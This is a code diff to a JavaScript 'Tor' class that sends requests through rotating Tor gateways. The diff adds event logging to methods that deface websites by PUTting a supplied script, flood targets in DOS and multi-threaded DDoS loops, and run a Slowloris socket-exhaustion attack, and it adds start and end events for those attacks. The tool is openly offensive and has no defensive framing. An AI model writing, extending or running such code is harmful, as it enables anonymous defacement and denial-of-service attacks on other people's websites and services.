@@ -52,6 +52,26 @@ class Tor {
         this.bypassCache = true;
         this.defaceScript = null;
         this.httpMethods = ['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'HEAD', 'OPTIONS'];
+        this.eventListeners = {};
+    }
+
+    addEventListener(event, callback) {
+        if (!this.eventListeners[event]) {
+            this.eventListeners[event] = [];
+        }
+        this.eventListeners[event].push(callback);
+    }
+
+    removeEventListener(event, callback) {
+        if (this.eventListeners[event]) {
+            this.eventListeners[event] = this.eventListeners[event].filter(cb => cb !== callback);
+        }
+    }
+
+    dispatchEvent(event, data) {
+        if (this.eventListeners[event]) {
+            this.eventListeners[event].forEach(callback => callback(data));
+        }
     }
 
     initRequestQueue() {
@@ -106,6 +126,7 @@ class Tor {
         } catch (error) {
             this.failedGateways.add(gateway);
             console.warn(`Gateway ${gateway} check failed:`, error);
+            this.dispatchEvent('log', { message: `Gateway ${gateway} check failed: ${error}`, level: 'warn' });
             return false;
         }
     }
@@ -119,9 +140,11 @@ class Tor {
                 if (isOnline && isFailed) {
                     this.failedGateways.delete(gateway);
                     console.log(`Gateway ${gateway} is back online.`);
+                    this.dispatchEvent('log', { message: `Gateway ${gateway} is back online.`, level: 'info' });
                 } else if (!isOnline && !isFailed) {
                     this.failedGateways.add(gateway);
                     console.warn(`Gateway ${gateway} is offline. Adding to blacklist.`);
+                    this.dispatchEvent('log', { message: `Gateway ${gateway} is offline. Adding to blacklist.`, level: 'warn' });
                 }
             }
         }, this.gatewayCheckInterval);
@@ -129,7 +152,9 @@ class Tor {
 
     async executeTorRequest(url, options = {}, retryCount = 0) {
         if (this.failedGateways.size === this.gateways.length) {
-            throw new Error("All Tor gateways are unavailable.");
+            const errorMessage = "All Tor gateways are unavailable.";
+            this.dispatchEvent('log', { message: errorMessage, level: 'error' });
+            throw new Error(errorMessage);
         }
 
         let gateway = this.gateways[this.currentIndex];
@@ -154,24 +179,38 @@ class Tor {
 
             if (!response.ok) {
                 this.failedGateways.add(gateway);
-                console.warn(`Gateway ${gateway} failed. Adding to blacklist.`);
+                const warnMessage = `Gateway ${gateway} failed. Adding to blacklist.`;
+                console.warn(warnMessage);
+                this.dispatchEvent('log', { message: warnMessage, level: 'warn' });
                 if (retryCount < this.maxRetries) {
-                    console.log(`Retrying with a different gateway. Retry count: ${retryCount + 1}`);
+                    const retryMessage = `Retrying with a different gateway. Retry count: ${retryCount + 1}`;
+                    console.log(retryMessage);
+                    this.dispatchEvent('log', { message: retryMessage, level: 'info' });
                     return this.executeTorRequest(url, options, retryCount + 1);
                 } else {
-                    throw new Error(`HTTP error! status: ${response.status} - Max retries reached.`);
+                    const errorMessage = `HTTP error! status: ${response.status} - Max retries reached.`;
+                    this.dispatchEvent('log', { message: errorMessage, level: 'error' });
+                    throw new Error(errorMessage);
                 }
             }
+
+            this.dispatchEvent('log', { message: `Request successful: ${url}`, level: 'info' });
             return response;
         } catch (error) {
             this.failedGateways.add(gateway);
-            console.error(`Tor fetch error with gateway ${gateway}:`, error);
+            const errorMessage = `Tor fetch error with gateway ${gateway}: ${error}`;
+            console.error(errorMessage, error);
+            this.dispatchEvent('log', { message: errorMessage, level: 'error' });
 
             if (retryCount < this.maxRetries) {
-                console.log(`Retrying with a different gateway. Retry count: ${retryCount + 1}`);
+                const retryMessage = `Retrying with a different gateway. Retry count: ${retryCount + 1}`;
+                console.log(retryMessage);
+                this.dispatchEvent('log', { message: retryMessage, level: 'info' });
                 return this.executeTorRequest(url, options, retryCount + 1);
             } else {
-                console.error("Max retries reached. Marking URL as potentially unreachable.");
+                const finalErrorMessage = "Max retries reached. Marking URL as potentially unreachable.";
+                console.error(finalErrorMessage);
+                this.dispatchEvent('log', { message: finalErrorMessage, level: 'error' });
                 throw error;
             }
         }
@@ -201,9 +240,13 @@ class Tor {
         };
 
         try {
-            return await this.fetchWithTor(url, options, retryCount);
+            const response = await this.fetchWithTor(url, options, retryCount);
+            this.dispatchEvent('log', { message: `POST request successful: ${url}`, level: 'info' });
+            return response;
         } catch (error) {
-            console.error("POST request failed:", error);
+            const errorMessage = `POST request failed: ${error}`;
+            console.error(errorMessage, error);
+            this.dispatchEvent('log', { message: errorMessage, level: 'error' });
             throw error;
         }
     }
@@ -214,7 +257,9 @@ class Tor {
             const response = await fetch(url, { ...options, headers: allHeaders });
             return response;
         } catch (error) {
-            console.error("Raw fetch error:", error);
+            const errorMessage = `Raw fetch error: ${error}`;
+            console.error(errorMessage, error);
+            this.dispatchEvent('log', { message: errorMessage, level: 'error' });
             throw error;
         }
     }
@@ -237,20 +282,27 @@ class Tor {
         };
 
         try {
-            return await this.rawFetch(url, options);
+            const response = await this.rawFetch(url, options);
+            this.dispatchEvent('log', { message: `Raw POST request successful: ${url}`, level: 'info' });
+            return response;
         } catch (error) {
-            console.error("Raw POST request failed:", error);
+            const errorMessage = `Raw POST request failed: ${error}`;
+            console.error(errorMessage, error);
+            this.dispatchEvent('log', { message: errorMessage, level: 'error' });
             throw error;
         }
     }
 
     setCustomHeaders(headers) {
         this.customHeaders = headers;
+        this.dispatchEvent('log', { message: 'Custom headers set.', level: 'info' });
     }
 
     async defaceWebsite(url) {
         if (!this.defaceScript) {
-            console.error('Deface script not set. Use setDefaceScript() first.');
+            const errorMessage = 'Deface script not set. Use setDefaceScript() first.';
+            console.error(errorMessage);
+            this.dispatchEvent('log', { message: errorMessage, level: 'error' });
             return;
         }
 
@@ -285,22 +337,31 @@ class Tor {
             const putResponse = await this.fetchWithTor(url, options);
 
             if (putResponse.ok) {
-                console.log('Website defaced successfully!');
+                const successMessage = 'Website defaced successfully!';
+                console.log(successMessage);
+                this.dispatchEvent('log', { message: successMessage, level: 'success' });
             } else {
-                console.error(`Failed to deface website. Status: ${putResponse.status}`);
+                const errorMessage = `Failed to deface website. Status: ${putResponse.status}`;
+                console.error(errorMessage);
+                this.dispatchEvent('log', { message: errorMessage, level: 'error' });
             }
         } catch (error) {
-            console.error('Deface operation failed:', error);
+            const errorMessage = `Deface operation failed: ${error}`;
+            console.error(errorMessage, error);
+            this.dispatchEvent('log', { message: errorMessage, level: 'error' });
         }
     }
 
     setDefaceScript(script) {
         this.defaceScript = script;
+        this.dispatchEvent('log', { message: 'Deface script set.', level: 'info' });
     }
 
     async genericRequest(url, method = 'GET', data = null, headers = {}) {
         if (!this.httpMethods.includes(method.toUpperCase())) {
-            throw new Error(`Invalid HTTP method: ${method}`);
+            const errorMessage = `Invalid HTTP method: ${method}`;
+            this.dispatchEvent('log', { message: errorMessage, level: 'error' });
+            throw new Error(errorMessage);
         }
 
         const options = {
@@ -320,9 +381,12 @@ class Tor {
 
         try {
             const response = await this.fetchWithTor(url, options);
+            this.dispatchEvent('log', { message: `${method} request successful: ${url}`, level: 'info' });
             return response;
         } catch (error) {
-            console.error(`${method} request failed:`, error);
+            const errorMessage = `${method} request failed: ${error}`;
+            console.error(errorMessage, error);
+            this.dispatchEvent('log', { message: errorMessage, level: 'error' });
             throw error;
         }
     }
@@ -376,16 +440,20 @@ class Tor {
       const endTime = startTime + (duration * 1000);
       let requestCount = 0;
 
+      this.dispatchEvent('attackStart', { type: 'DOS', target: url, requestsPerSecond, duration });
+
       while (Date.now() < endTime) {
         for (let i = 0; i < requestsPerSecond; i++) {
           this.fetchWithTor(url, { method: 'GET' })
             .then(response => {
               if (!response.ok) {
                 console.warn(`Request failed with status: ${response.status}`);
+                this.dispatchEvent('log', { message: `Request failed with status: ${response.status}`, level: 'warn' });
               }
             })
             .catch(error => {
               console.error('Request error:', error);
+              this.dispatchEvent('log', { message: `Request error: ${error}`, level: 'error' });
             });
           requestCount++;
         }
@@ -393,6 +461,7 @@ class Tor {
         await new Promise(resolve => setTimeout(resolve, 1000));
       }
 
+      this.dispatchEvent('attackEnd', { type: 'DOS', target: url, totalRequests: requestCount });
       console.log(`DOS attack completed. Total requests sent: ${requestCount}`);
     }
 
@@ -401,6 +470,8 @@ class Tor {
         let requestCount = 0;
         let activeThreads = 0;
 
+        this.dispatchEvent('attackStart', { type: 'DDOS', target: url, threads, duration });
+
         const attackThread = async () => {
             activeThreads++;
             while (Date.now() < endTime) {
@@ -408,10 +479,12 @@ class Tor {
                     const response = await this.fetchWithTor(url, { method: 'GET' });
                     if (!response.ok) {
                         console.warn(`Request failed with status: ${response.status}`);
+                        this.dispatchEvent('log', { message: `Request failed with status: ${response.status}`, level: 'warn' });
                     }
                     requestCount++;
                 } catch (error) {
                     console.error('Request error:', error);
+                    this.dispatchEvent('log', { message: `Request error: ${error}`, level: 'error' });
                 }
             }
             activeThreads--;
@@ -423,12 +496,16 @@ class Tor {
         }
 
         await Promise.all(threadPromises);
+
+        this.dispatchEvent('attackEnd', { type: 'DDOS', target: url, totalRequests: requestCount, threads });
         console.log(`DDoS attack completed. Total requests sent: ${requestCount} with ${threads} threads.`);
     }
 
     async slowlorisAttack(url, sockets = 200, duration = 60) {
         const endTime = Date.now() + (duration * 1000);
         let socketCount = 0;
+
+        this.dispatchEvent('attackStart', { type: 'Slowloris', target: url, sockets, duration });
 
         const sendKeepAlive = async (socket) => {
             try {
@@ -442,9 +519,11 @@ class Tor {
                     setTimeout(() => sendKeepAlive(socket), 15000);
                 } else {
                     socket.destroy();
+                    this.dispatchEvent('log', { message: 'Socket destroyed.', level: 'info' });
                 }
             } catch (error) {
                 console.error('Slowloris error:', error);
+                this.dispatchEvent('log', { message: `Slowloris error: ${error}`, level: 'error' });
                 socket.destroy();
             }
         };
@@ -459,10 +538,12 @@ class Tor {
                             setTimeout(createSocket, 100);
                         } else {
                             console.warn('Slowloris socket creation failed');
+                            this.dispatchEvent('log', { message: 'Slowloris socket creation failed', level: 'warn' });
                         }
                     })
                     .catch(error => {
                         console.error('Socket creation error:', error);
+                        this.dispatchEvent('log', { message: `Socket creation error: ${error}`, level: 'error' });
                     });
             }
         };
@@ -472,8 +553,10 @@ class Tor {
         }
 
         console.log(`Slowloris attack started with ${sockets} sockets.`);
+        this.dispatchEvent('log', { message: `Slowloris attack started with ${sockets} sockets.`, level: 'info' });
         await new Promise(resolve => setTimeout(resolve, duration * 1000));
         console.log('Slowloris attack completed.');
+        this.dispatchEvent('attackEnd', { type: 'Slowloris', target: url, sockets });
     }
 
 }
